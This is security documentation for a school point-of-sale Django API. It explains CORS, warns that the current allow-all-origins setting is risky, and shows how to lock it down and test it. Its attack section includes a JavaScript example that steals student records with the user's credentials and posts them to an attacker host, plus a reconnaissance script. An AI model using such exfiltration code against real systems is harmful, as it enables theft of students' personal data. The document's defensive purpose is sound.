# CORS Configuration for School POS

## Backend API Security Documentation

---

## Table of Contents

1. What is CORS?
2. How CORS Works
3. CORS Headers Explained
4. Current Configuration
5. CORS Security Risks
6. How Hackers Can Exploit CORS Misconfigurations
7. Attack Scenarios
8. Security Configuration Options
9. How to Change CORS Settings
10. Common CORS Errors and Solutions
11. Troubleshooting CORS Issues
12. Testing CORS Configuration
13. Summary and Best Practices

---

## 1. What is CORS?

**Cross-Origin Resource Sharing (CORS)** is a security mechanism implemented by web browsers that restricts web pages from making requests to a different domain than the one that served the web page.

CORS is essential for:
- Protecting user data from unauthorized access
- Controlling which websites can access your API
- Preventing cross-site request forgery (CSRF) attacks

When your frontend (e.g., http://192.168.123.100:5173) tries to access your backend API (e.g., http://192.168.123.127:8000), the browser checks if the backend allows this cross-origin request through CORS headers.

---

## 2. How CORS Works

### The CORS Workflow:

**Step 1: Simple Request**
- Browser sends request with Origin header
- Server checks Origin against allowed origins
- Server responds with Access-Control-Allow-Origin header
- Browser allows or blocks response

**Step 2: Preflight Request (For complex requests)**
- Browser first sends OPTIONS request (preflight)
- Server responds with allowed methods and headers
- Browser then sends actual request
- Server responds with data

### When Preflight is Required:
- POST, PUT, DELETE methods
- Content-Type: application/json
- Custom headers

---

## 3. CORS Headers Explained

| Header | Description |
|--------|-------------|
| **Access-Control-Allow-Origin** | Specifies which origins can access the resource. Use * for any origin, or a specific URL. **This is the MOST IMPORTANT header.** |
| **Access-Control-Allow-Methods** | Lists the HTTP methods (GET, POST, PUT, DELETE, OPTIONS, PATCH) allowed for cross-origin requests. |
| **Access-Control-Allow-Headers** | Indicates which HTTP headers can be used during the actual request (e.g., Content-Type, Authorization). |
| **Access-Control-Allow-Credentials** | When set to True, allows cookies and authorization headers to be sent cross-origin. **CRITICAL for security.** |
| **Access-Control-Max-Age** | Specifies how long the preflight response can be cached (in seconds). Longer = fewer preflight requests. |
| **Access-Control-Expose-Headers** | Lists which response headers the browser can access (e.g., X-Custom-Header). |
| **Vary: Origin** | Tells caches that the response varies based on the Origin header. **IMPORTANT for caching.** |

---

## 4. Current Configuration

The backend is configured for LAN deployment with:

```python
CORS_ALLOW_ALL_ORIGINS = True
CORS_ALLOW_CREDENTIALS = True
```

### This means:
- **ANY** website can make requests to your API
- Authentication tokens can be sent cross-origin
- Browser will **NOT** block any cross-origin requests

---

## 5. CORS Security Risks

### Understanding CORS Security:

**CORS is NOT a firewall.** It only protects:
- Browser-based requests
- Cross-origin requests from JavaScript

**CORS does NOT protect against:**
- Server-to-server requests (curl, Postman, etc.)
- Direct access to your API endpoints
- DDoS attacks
- SQL injection, XSS, or other web vulnerabilities

### Why CORS_ALLOW_ALL_ORIGINS is Dangerous

When `CORS_ALLOW_ALL_ORIGINS = True`:
- ANY website can access your API
- Attackers can steal user data
- Malicious sites can make requests on behalf of users
- If API has vulnerabilities, they can be exploited

---

## 6. How Hackers Can Exploit CORS Misconfigurations

### Attack Vector 1: Data Exfiltration

If an attacker tricks a logged-in user to visit a malicious site:

```javascript
// Malicious website JavaScript
fetch("http://192.168.123.127:8000/api/students/", {
  credentials: "include"  // Include cookies
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker's server
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify(data)
  })
})
```

**Result:** Attacker gets all student data if CORS allows credentials.

---

### Attack Vector 2: Account Takeover

**Steps:**
1. User logs into School POS
2. User visits malicious website (in same browser)
3. Malicious site makes API calls using user's session
4. Attacker can:
   - Change student grades
   - Modify payment records
   - Delete data
   - Create fake enrollments
   - Access sensitive student information

---

### Attack Vector 3: API Reconnaissance

Even without credentials, attackers can:
- Discover API endpoints
- Map out data structures
- Find vulnerabilities
- Test for SQL injection, XSS, etc.

```javascript
// Reconnaissance script
const endpoints = [
  "/api/students/",
  "/api/payments/",
  "/api/grades/",
  "/api/users/",
  "/api/enrollments/",
];

endpoints.forEach(ep => {
  fetch(ep).then(r => console.log(ep, r.status))
})
```

---

### Attack Vector 4: XSS + CORS Chaining

**Attack:**
1. Attacker finds XSS vulnerability in School POS
2. Injects malicious script into the application
3. Script makes API calls to other endpoints
4. CORS allows all origins, so requests succeed
5. Attacker escalates privileges or steals more data

---

## 7. Attack Scenarios

### Scenario 1: Public WiFi Attack

**Location:** School cafeteria with free WiFi

**Attack:**
1. Attacker sets up fake WiFi hotspot
2. User connects to fake WiFi
3. Attacker injects malicious JavaScript into any HTTP page
4. When user accesses School POS, malicious JS runs
5. All data sent to attacker

---

### Scenario 2: Malicious Employee

**Attack:**
1. Employee creates personal website
2. Website makes requests to School POS API
3. If user visits site while logged in, data stolen
4. Employee collects sensitive information
5. Sells data or uses for identity theft

---

### Scenario 3: Compromised Website

**Attack:**
1. Attacker hacks a legitimate website (e.g., school blog)
2. Adds malicious JavaScript to the blog
3. When staff visits the blog, their browser makes requests to School POS
4. Attacker gains access to staff sessions and data

---

### Scenario 4: Man-in-the-Middle (MITM)

**Attack:**
1. Attacker intercepts network traffic
2. Modifies responses to inject CORS headers
3. Allows malicious sites to access School POS API
4. Steals authentication tokens from traffic

---

## 8. Security Configuration Options

### Option 1: Allow All (CURRENT - VERY RISKY)

```python
CORS_ALLOW_ALL_ORIGINS = True  # DANGEROUS!
CORS_ALLOW_CREDENTIALS = True
```

**RISK:** Anyone can access your API. Only use for development.

---

### Option 2: Specific IP Addresses (RECOMMENDED for LAN)

```python
CORS_ALLOW_ALL_ORIGINS = False

CORS_ALLOWED_ORIGINS = [
    "http://192.168.123.100:5173",  # Client Computer 1
    "http://192.168.123.101:5173",  # Client Computer 2
    "http://192.168.123.102:5173",  # Client Computer 3
    "http://192.168.123.103:5173",  # Client Computer 4
    "http://192.168.123.104:5173",  # Client Computer 5
    "http://localhost:5173",         # Developer machine
]

CORS_ALLOW_CREDENTIALS = True
```

**SECURITY:** Only known computers can access the API.

---

### Option 3: Environment-Based Configuration

```python
# In settings.py:
import os

CORS_ALLOW_ALL_ORIGINS = os.getenv("DEBUG", "False") == "True"

CORS_ORIGINS = os.getenv("CORS_ORIGINS", "").split(",")
CORS_ALLOWED_ORIGINS = [origin.strip() for origin in CORS_ORIGINS if origin.strip()]

CORS_ALLOW_CREDENTIALS = True
```

```bash
# In .env for production:
CORS_ORIGINS=http://192.168.123.100:5173,http://192.168.123.101:5173
```

---

### Option 4: Production with Domain

```python
CORS_ALLOW_ALL_ORIGINS = False

CORS_ALLOWED_ORIGINS = [
    "https://schoolpos.yourdomain.com",
    "https://www.yourdomain.com",
]

CORS_ALLOW_CREDENTIALS = True
CORS_ALLOWED_HOSTS = ["schoolpos.yourdomain.com"]
```

---

## 9. How to Change CORS Settings

### Step 1: Edit settings.py
- File: `school_pos/school_pos/settings.py`
- Lines: ~280-290

### Step 2: Modify CORS settings
```python
# Change from:
CORS_ALLOW_ALL_ORIGINS = True

# To:
CORS_ALLOW_ALL_ORIGINS = False
CORS_ALLOWED_ORIGINS = [
    "http://192.168.123.100:5173",
    "http://192.168.123.101:5173",
    # Add all client IPs here
]
```

### Step 3: Restart server
```bash
# If using Gunicorn:
gunicorn school_pos.asgi:application --workers 4 --worker-class uvicorn.workers.UvicornWorker --bind 0.0.0.0:8000
```

### Step 4: Test each client
Verify all client computers can access the API

---

## 10. Common CORS Errors and Solutions

| Error | Solution |
|-------|----------|
| **No 'Access-Control-Allow-Origin' header** | Enable CORS in settings.py and add origin to CORS_ALLOWED_ORIGINS |
| **Credentials not supported if origin is '*'** | Change CORS_ALLOW_ALL_ORIGINS to False and use specific origins |
| **Preflight channel error** | Ensure OPTIONS method is allowed; check CORS_ALLOW_METHODS |
| **Origin not found in allowed origins** | Add the client IP to CORS_ALLOWED_ORIGINS |
| **Method not allowed** | Add the HTTP method to CORS_ALLOW_METHODS |
| **Header not allowed** | Add custom headers to CORS_ALLOW_HEADERS |
| **Request blocked by CORS policy** | Check browser console for specific error; verify settings |
| **localhost blocked in production** | Remove localhost from allowed origins when deploying |
| **Cookie not sent** | Ensure CORS_ALLOW_CREDENTIALS = True on both client and server |
| **CORS request did not succeed** | Check network tab for failed preflight OPTIONS request |
| **Invalid CORS origin** | Ensure origin format is correct (http://ip:port) |

---

## 11. Troubleshooting CORS Issues

### Step 1: Check Browser Console (F12)
- Look for red CORS errors
- Note the specific origin being blocked
- Check Network tab for OPTIONS request

### Step 2: Verify Server Headers
```bash
curl -H "Origin: http://192.168.123.100" http://192.168.123.127:8000/api/ -v
```
Look for: `Access-Control-Allow-Origin`

### Step 3: Test with Python
```python
python manage.py shell
>>> from django.conf import settings
>>> print(settings.CORS_ALLOWED_ORIGINS)
```

### Step 4: Check Django INSTALLED_APPS
- Ensure "corsheaders" is in INSTALLED_APPS
- Ensure "corsheaders.middleware.CorsMiddleware" is in MIDDLEWARE

### Step 5: Restart Server
CORS settings require server restart

---

## 12. Testing CORS Configuration

### Test 1: Browser Console
```javascript
fetch("http://192.168.123.127:8000/api/students/")
  .then(r => console.log(r.status, r.headers.get("access-control-allow-origin")))
  .catch(e => console.error(e))
```

### Test 2: curl Command
```bash
# Test simple GET request
curl -H "Origin: http://192.168.123.100" http://192.168.123.127:8000/api/ -v
```

### Test 3: Python Script
```python
import requests

url = "http://192.168.123.127:8000/api/"
headers = {"Origin": "http://192.168.123.100"}
response = requests.get(url, headers=headers)
print(response.headers.get("Access-Control-Allow-Origin"))
```

### Test 4: Security Check (IMPORTANT!)
```bash
# Test if ANY origin can access (SECURITY RISK!)
curl -H "Origin: https://malicious-site.com" http://192.168.123.127:8000/api/ -v

# If you see: Access-Control-Allow-Origin: *
# Your API is UNPROTECTED!
```

---

## 13. Summary and Best Practices

### For School POS LAN Deployment:

#### CURRENT STATE:
- `CORS_ALLOW_ALL_ORIGINS = True` (**HIGH RISK**)
- Any website can access your API
- Attackers can steal sensitive student data
- Personal Identifiable Information (PII) is exposed

#### RECOMMENDED CHANGES:

1. **Set `CORS_ALLOW_ALL_ORIGINS = False`**

2. **Add all client IP addresses to `CORS_ALLOWED_ORIGINS`:**
```python
CORS_ALLOWED_ORIGINS = [
    "http://192.168.123.100:5173",
    "http://192.168.123.101:5173",
    "http://192.168.123.102:5173",
    "http://192.168.123.103:5173",
    "http://192.168.123.104:5173",
]
```

3. **Test thoroughly after changes**

4. **Monitor API access logs regularly**

---

### Best Practices:

- ✅ Only allow specific, known IP addresses
- ✅ Use HTTPS in production
- ✅ Implement rate limiting
- ✅ Add API authentication (beyond session cookies)
- ✅ Regularly audit CORS settings
- ✅ Monitor for suspicious access patterns
- ✅ Train users about not visiting untrusted sites while logged in

---

### Additional Security Measures:

- Implement API key authentication
- Add request rate limiting
- Use Web Application Firewall (WAF)
- Regular security audits
- Keep Django and all packages updated
- Implement logging and alerting for suspicious activity

---

### What Data Could Be Stolen:

If CORS is misconfigured, attackers can access:
- Student personal information (names, addresses, phone numbers)
- Payment records and financial data
- Grades and academic records
- Enrollment information
- Medical/health records (if stored)
- Parent/guardian contact information
- Staff credentials and information

---

### Legal Implications:

A data breach due to misconfigured CORS could result in:
- GDPR/DPDA violations (data protection laws)
- Identity theft of students
- Financial fraud
- Reputational damage to the school
- Legal action from affected families

---

## For More Information:

- Django CORS: https://docs.djangoproject.com/en/5.2/ref/middleware/#cors-middleware
- OWASP CORS: https://owasp.org/www-community/attacks/CORS
- MDN CORS: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
- CORS Security Best Practices: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
